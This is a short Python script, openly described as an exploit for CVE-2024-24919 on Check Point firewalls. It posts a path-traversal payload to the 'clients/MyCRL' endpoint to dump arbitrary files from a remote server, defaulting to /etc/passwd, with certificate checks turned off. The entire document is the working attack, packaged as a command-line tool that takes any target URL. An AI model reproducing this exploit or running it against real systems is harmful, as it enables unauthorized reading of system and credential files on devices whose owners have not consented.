import requests
import argparse
from urllib.parse import urljoin

def send_post_request(base_url, file):
    # Define the full URL by appending 'clients/MyCRL' to the base URL
    full_url = urljoin(base_url, 'clients/MyCRL')
    full_payload = "aCSHELL/../../../../../../.." + file


    # Define headers, including Content-Length
    headers = {
        'Content-Length': str(len(full_payload))
    }

    # Send the POST request, ignoring SSL certificate errors
    response = requests.post(full_url, data=full_payload, headers=headers, verify=False)

    # Print the response status code and content
    print('Status Code:', response.status_code)
    print('Response:', response.content.decode())

if __name__ == "__main__":
    # Create the parser
    parser = argparse.ArgumentParser(description='Exploit the CVE-2024-24919 on the remote checkpoint firewall.')

    # Add the base URL argument
    parser.add_argument('-u', '--url', required=True, help='The base URL to send the POST request to.')

    # Add the payload argument
    parser.add_argument('-f', '--file', default='/etc/passwd', help='The file to be dumped from the remote checkpoint server.')
    # Parse the arguments
    args = parser.parse_args()

    # Send the POST request
    send_post_request(args.url, args.file)
